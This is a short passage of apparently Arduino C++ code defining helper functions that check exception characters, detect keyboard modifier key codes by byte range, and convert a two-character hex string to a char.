*/

bool IsException(char c)
{
  for(byte i=0; i<EXCEPTIONS_SIZE; i++)
  {
    if(c == exceptions[i])
    {
      return true;
    }
  }
  return false;
}


bool IsModifier(char c)
{
  byte b = (byte)c;
  if((b >= 128 && b <=135) || (b >= 176 && b <=179) || (b >= 193 && b <=205) || (b >= 209 && b <=218))
  {
    if(LOG_SERIAL){Serial.println("Is modifier");}
    return true;
  }
  return false;
}

char HexToChar(char *inStr)
{
  char strValBuff[3]={inStr[0],inStr[1],'\0'}; 
  return (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
}








